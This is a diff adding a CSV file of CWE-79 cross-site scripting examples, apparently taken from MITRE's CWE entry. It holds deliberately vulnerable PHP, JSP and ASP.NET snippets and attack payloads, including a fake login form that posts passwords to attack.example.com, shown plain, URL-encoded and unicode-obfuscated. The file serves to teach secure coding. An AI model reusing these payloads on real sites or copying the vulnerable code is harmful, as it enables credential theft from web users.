@@ -1,0 +1,150 @@
+cwe_id,example_id,entry_order,IntroText,Nature,Language,ExampleCode,BodyText
+79,GEN-1,1,The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).,NULL,NULL,NULL,NULL
+79,GEN-1,2,NULL,Bad,PHP,"```
+	$username = $_GET['username'];
+	echo '<div class=""header""> Welcome, ' . $username . '</div>';
+```",NULL
+79,GEN-1,3,NULL,NULL,NULL,NULL,"Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as"
+79,GEN-1,4,NULL,Attack,NULL,"```
+	http://trustedSite.example.com/welcome.php?username=<Script Language=""Javascript"">alert(""You've been attacked!"");</Script>
+```",NULL
+79,GEN-1,5,NULL,NULL,NULL,NULL,"This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers."
+79,GEN-1,6,NULL,NULL,NULL,NULL,"More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:"
+79,GEN-1,7,NULL,Attack,NULL,"```
+	http://trustedSite.example.com/welcome.php?username=<div id=""stealPassword"">Please Login:<form name=""input"" action=""http://attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div>
+```",NULL
+79,GEN-1,8,NULL,NULL,NULL,NULL,If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:
+79,GEN-1,9,NULL,Result,NULL,"```
+	<div class=""header""> Welcome, <div id=""stealPassword""> Please Login:
+		<form name=""input"" action=""attack.example.com/stealPassword.php"" method=""post"">
+			Username: <input type=""text"" name=""username"" /><br/>
+			Password: <input type=""password"" name=""password"" /><br/>
+			<input type=""submit"" value=""Login"" />
+		</form>
+	</div></div>
+```",NULL
+79,GEN-1,10,NULL,NULL,NULL,NULL,"The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):"
+79,GEN-1,11,NULL,Attack,NULL,"```
+	trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
+	stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
+	%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
+	%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
+	%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+	+%3Cinput+type%3D%22password%22+name%3D%22password%22
+	+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+	+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
+```",NULL
+79,GEN-1,12,NULL,NULL,NULL,NULL,The same attack string could also be obfuscated as:
+79,GEN-1,13,NULL,Attack,NULL,"```
+	trustedSite.example.com/welcome.php?username=<script+type=""text/javascript"">
+	document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
+	\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
+	\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
+	\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
+	\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
+	\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
+	\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
+	\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
+	\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
+	\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
+	\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
+	\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
+	\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
+	\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
+	\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
+	\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
+	\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
+	\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
+	\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
+	\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
+	\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
+	\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
+	\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>
+```",NULL
+79,GEN-1,14,NULL,NULL,NULL,NULL,"Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs."
+79,GEN-2,1,The following code displays a Reflected XSS (Type 1) scenario.,NULL,NULL,NULL,NULL
+79,GEN-2,2,NULL,NULL,NULL,NULL,"The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user."
+79,GEN-2,3,NULL,Bad,JSP,"```
+	<% String eid = request.getParameter(""eid""); %>
+	...
+	Employee ID: <%= eid %>
+```",NULL
+79,GEN-2,4,NULL,NULL,NULL,NULL,The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.
+79,GEN-2,5,NULL,Bad,ASP.NET,"```
+	<%
+	protected System.Web.UI.WebControls.TextBox Login;
+	protected System.Web.UI.WebControls.Label EmployeeID;
+	...
+	EmployeeID.Text = Login.Text;
+	%>
+	<p><asp:label id=""EmployeeID"" runat=""server"" /></p>
+```",NULL
+79,GEN-2,6,NULL,NULL,NULL,NULL,"The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response."
+79,GEN-3,1,The following code displays a Stored XSS (Type 2) scenario.,NULL,NULL,NULL,NULL
+79,GEN-3,2,NULL,NULL,NULL,NULL,The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.
+79,GEN-3,3,NULL,Bad,JSP,"```
+	<%Statement stmt = conn.createStatement();
+	ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid);
+	if (rs != null) {
+		rs.next();
+		String name = rs.getString(""name"");
+	}%>
+	Employee Name: <%= name %>
+```",NULL
+79,GEN-3,4,NULL,NULL,NULL,NULL,The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.
+79,GEN-3,5,NULL,Bad,ASP.NET,"```
+	<%
+	protected System.Web.UI.WebControls.Label EmployeeName;
+	...
+	string query = ""select * from emp where id="" + eid;
+	sda = new SqlDataAdapter(query, conn);
+	sda.Fill(dt);
+	string name = dt.Rows[0][""Name""];
+	...
+	EmployeeName.Text = name;%>
+	<p><asp:label id=""EmployeeName"" runat=""server"" /></p>
+```",NULL
+79,GEN-3,6,NULL,NULL,NULL,NULL,"This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser."
+79,GEN-4,1,"The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.",NULL,NULL,NULL,NULL
+79,GEN-4,2,NULL,NULL,NULL,NULL,CreateUser.php
+79,GEN-4,3,NULL,Bad,PHP,"```
+	$username = mysql_real_escape_string($username);
+	$fullName = mysql_real_escape_string($fullName);
+	$query = sprintf('Insert Into users (username,password) Values (""%s"",""%s"",""%s"")', $username, crypt($password),$fullName) ;
+	mysql_query($query);
+	/.../
+```",NULL
+79,GEN-4,4,NULL,NULL,NULL,NULL,The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:
+79,GEN-4,5,NULL,NULL,NULL,NULL,ListUsers.php
+79,GEN-4,6,NULL,Bad,PHP,"```
+	$query = 'Select * From users Where loggedIn=true';
+	$results = mysql_query($query);
+	if (!$results) {
+		exit;
+	}
+```
+//Print list of users to page* 
+	echo '<div id=""userlist"">Currently Active Users:';
+	while ($row = mysql_fetch_assoc($results)) {
+	```
+		echo '<div class=""userNames"">'.$row['fullname'].'</div>';
+	}
+	echo '</div>';
+```",NULL
+79,GEN-4,7,NULL,NULL,NULL,NULL,"The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message."
+79,GEN-5,1,"The following code is a simplistic message board that saves messages in HTML format and appends them to a file. When a new user arrives in the room, it makes an announcement:",NULL,NULL,NULL,NULL
+79,GEN-5,2,NULL,Bad,PHP,"```
+	$name = $_COOKIE[""myname""];
+	$announceStr = ""$name just logged in."";
+```
+//save HTML-formatted message to file; implementation details are irrelevant for this example.* 
+	 saveMessage($announceStr);",NULL
+79,GEN-5,3,NULL,NULL,NULL,NULL,An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:
+79,GEN-5,4,NULL,Attack,NULL,"```
+	<script>document.alert('Hacked');</script>
+```",NULL
+79,GEN-5,5,NULL,NULL,NULL,NULL,The raw contents of the message file would look like:
+79,GEN-5,6,NULL,Result,NULL,"```
+	<script>document.alert('Hacked');</script> has logged in.
+```",NULL
+79,GEN-5,7,NULL,NULL,NULL,NULL,"For each person who visits the message page, their browser would execute the script, generating a pop-up window that says ""Hacked"". More malicious attacks are possible; see the rest of this entry."
